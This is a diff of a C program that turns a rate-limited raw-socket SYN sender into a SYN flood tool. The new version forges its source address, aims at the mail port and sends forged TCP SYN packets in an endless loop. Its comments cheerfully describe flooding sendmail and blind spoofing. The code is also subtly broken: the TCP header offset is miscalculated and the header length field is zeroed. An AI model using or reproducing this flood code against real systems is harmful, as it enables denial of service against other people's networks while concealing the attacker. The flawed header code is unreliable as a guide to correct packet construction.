@@ -1,138 +1,98 @@
-#include <unistd.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <sys/socket.h>
+#define __USE_BSD	/* use bsd'ish ip header */
+#include <sys/socket.h>	/* these headers are for a Linux system, but */
+#include <netinet/in.h>	/* the names on other systems are easy to guess.. */
 #include <netinet/ip.h>
+#define __FAVOR_BSD	/* use bsd'ish tcp header */
 #include <netinet/tcp.h>
+#include <unistd.h>
 #include <string.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
+#include <stdio.h>
+#include <stdlib.h>
+#define P 25		/* lets flood the sendmail port */
 
-// Packet length
-#define PCKT_LEN 8192
-
-struct ipheader {
-	unsigned char iph_ihl:5, iph_ver:4;
-	unsigned char iph_tos;
-	unsigned short int iph_len;
-	unsigned short int iph_ident;
-	unsigned char iph_flags;
-	unsigned short int iph_offset;
-	unsigned char iph_ttl;
-	unsigned char iph_protocol;
-	unsigned short int iph_chksum;
-	unsigned int iph_sourceip;
-	unsigned int iph_destip;
-};
-
-struct tcpheader {
-	unsigned short int tcph_srcport;
-	unsigned short int tcph_destport;
-	unsigned int tcph_seqnum;
-	unsigned int tcph_acknum;
-	unsigned char tcph_reserved:4, tcph_offset:4;
-	// unsigned char tcph_flags
-	unsigned int
-		tcp_resl:4,
-		tcph_hlen:4,
-		tcph_fin:1,
-		tcph_syn:1,
-		tcph_psh:1,
-		tcph_ack:1,
-		tcph_urg:1,
-		tcph_res2:2;
-	unsigned short int tcph_win;
-	unsigned short int tcph_chksum;
-	unsigned short int tcph_urgptr;
-};
-
-// CHecksum function
-unsigned short csum(unsigned short *buf, int len) {
-	unsigned long sum;
-	for (sum=0; len>0; len--) {
-		sum += *buf++;
-	}
-	sum = (sum >> 16) + (sum &0xffff);
-	sum += (sum >> 16);
-	return (unsigned short) (~sum);
+unsigned short		/* this function generates header checksums */
+csum (unsigned short *buf, int nwords)
+{
+  unsigned long sum;
+  for (sum = 0; nwords > 0; nwords--)
+    sum += *buf++;
+  sum = (sum >> 16) + (sum & 0xffff);
+  sum += (sum >> 16);
+  return ~sum;
 }
 
-int main(int argc, char *argv[]) {
-	int sd;
-	char buffer[PCKT_LEN];
-	struct ipheader *ip = (struct ipheader *) buffer;
-	struct tcpheader *tcp = (struct tcpheader *) (buffer + sizeof(struct ipheader));
-	struct sockaddr_in sin, din;
-	int one = 1;
-	const int *val = &one;
-	memset(buffer, 0, PCKT_LEN);
+int 
+main (void)
+{
+  int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);	/* open raw socket */
+  char datagram[4096];	/* this buffer will contain ip header, tcp header,
+			   and payload. we'll point an ip header structure
+			   at its beginning, and a tcp header structure after
+			   that to write the header values into it */
+  struct ip *iph = (struct ip *) datagram;
+  struct tcphdr *tcph = (struct tcphdr *) datagram + sizeof (struct ip);
+  struct sockaddr_in sin;
+			/* the sockaddr_in containing the dest. address is used
+			   in sendto() to determine the datagrams path */
 
-	if (argc != 5) {
-		printf("- Invalid parameters!!!\n");
-		exit(-1);
-	} else {
-		printf("socket()-SOCK_RAW and tcp protocol is OK.\n");
-	}
+  sin.sin_family = AF_INET;
+  sin.sin_port = htons (P);/* you byte-order >1byte header values to network
+			      byte order (not needed on big endian machines) */
+  sin.sin_addr.s_addr = inet_addr ("127.0.0.1");
 
-	sd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
-	if (sd < 0) {
-		printf("here??\n");
-		perror("socket() error");
-		exit(-1);
-	} else {
-		printf("socket()-SOCK_RAW and tcp protocol is OK.\n");
-	}
+  memset (datagram, 0, 4096);	/* zero out the buffer */
 
-	sin.sin_family = AF_INET;
-	din.sin_family = AF_INET;
-	// Source port, can be any, modify as needed
-	sin.sin_port = htons(atoi(argv[2]));
-	din.sin_port = htons(atoi(argv[4]));
-	// Source IP, can be any, modify as needed
-	sin.sin_addr.s_addr = inet_addr(argv[1]);
-	din.sin_addr.s_addr = inet_addr(argv[3]);
+/* we'll now fill in the ip/tcp header values, see above for explanations */
+  iph->ip_hl = 5;
+  iph->ip_v = 4;
+  iph->ip_tos = 0;
+  iph->ip_len = sizeof (struct ip) + sizeof (struct tcphdr);	/* no payload */
+  iph->ip_id = (u_short) htonl (54321);	/* the value doesn't matter here */
+  iph->ip_off = 0;
+  iph->ip_ttl = 255;
+  iph->ip_p = 6;
+  iph->ip_sum = 0;		/* set it to 0 before computing the actual checksum later */
+  iph->ip_src.s_addr = inet_addr ("1.2.3.4");/* SYN's can be blindly spoofed */
+  iph->ip_dst.s_addr = sin.sin_addr.s_addr;
+  tcph->th_sport = htons (1234);	/* arbitrary port */
+  tcph->th_dport = htons (P);
+  tcph->th_seq = random ();/* in a SYN packet, the sequence is a random */
+  tcph->th_ack = 0;/* number, and the ack sequence is 0 in the 1st packet */
+  tcph->th_x2 = 0;
+  tcph->th_off = 0;		/* first and only tcp segment */
+  tcph->th_flags = TH_SYN;	/* initial connection request */
+  tcph->th_win = (u_short) htonl (65535);	/* maximum allowed window size */
+  tcph->th_sum = 0;/* if you set a checksum to zero, your kernel's IP stack
+		      should fill in the correct checksum during transmission */
+  tcph->th_urp = 0;
 
-	ip->iph_ihl = 5;
-	ip->iph_ver = 4;
-	ip->iph_tos = 16;
-	ip->iph_len = sizeof(struct ipheader) + sizeof(struct tcpheader);
-	ip->iph_offset = 0;
-	ip->iph_ttl = 64;
-	ip->iph_protocol = 6;
-	ip->iph_chksum = 0;
+  iph->ip_sum = csum ((unsigned short *) datagram, iph->ip_len >> 1);
 
-	ip->iph_sourceip = inet_addr(argv[1]);
-	ip->iph_destip = inet_addr(argv[3]);
+/* finally, it is very advisable to do a IP_HDRINCL call, to make sure
+   that the kernel knows the header is included in the data, and doesn't
+   insert its own header into the packet before our data */
 
-	tcp->tcph_srcport = htons(atoi(argv[2]));
-	tcp->tcph_destport = htons(atoi(argv[4]));
-	tcp->tcph_seqnum = htonl(1);
-	tcp->tcph_acknum = 0;
-	tcp->tcph_offset = 5;
-	tcp->tcph_syn = 1;
-	tcp->tcph_ack = 0;
-	tcp->tcph_win = htons(32767);
-	tcp->tcph_urgptr = 0;
+  {				/* lets do it the ugly way.. */
+    int one = 1;
+    const int *val = &one;
+    if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
+      printf ("Warning: Cannot set HDRINCL!\n");
+  }
 
-	ip->iph_chksum = csum((unsigned short *) buffer, (sizeof(struct ipheader) + sizeof(struct tcpheader)));
-	if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
-		perror("setsockopt() error");
-		exit(-1);
-	}
-	printf("Using:::::Source IP: %s port: %u, Target IP: %s port: %u.\n", argv[1], atoi(argv[2]), argv[3], atoi(argv[4]));
-	unsigned int count;
-	for (count = 0; count < 20; count++) {
-		printf("sd=%d\n", sd);
-		printf("buffer=%c\n", buffer[0]);
-		if (sendto(sd, (const void *)buffer, ip->iph_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
-			perror("sendto() error");
-			exit(-1);
-		} else {
-			printf("Count #%u - sendto() is OK\n", count);	
-		}
-		sleep(2);
-	}
-	close(sd);
-	return 0;
- 
+  while (1)
+    {
+      if (sendto (s,		/* our socket */
+		  datagram,	/* the buffer containing headers and data */
+		  iph->ip_len,	/* total length of our datagram */
+		  0,		/* routing flags, normally always 0 */
+		  (struct sockaddr *) &sin,	/* socket addr, just like in */
+		  sizeof (sin)) < 0)		/* a normal send() */
+	printf ("error\n");
+      else
+	printf ("success. ");
+    }
+
+  return 0;
 }
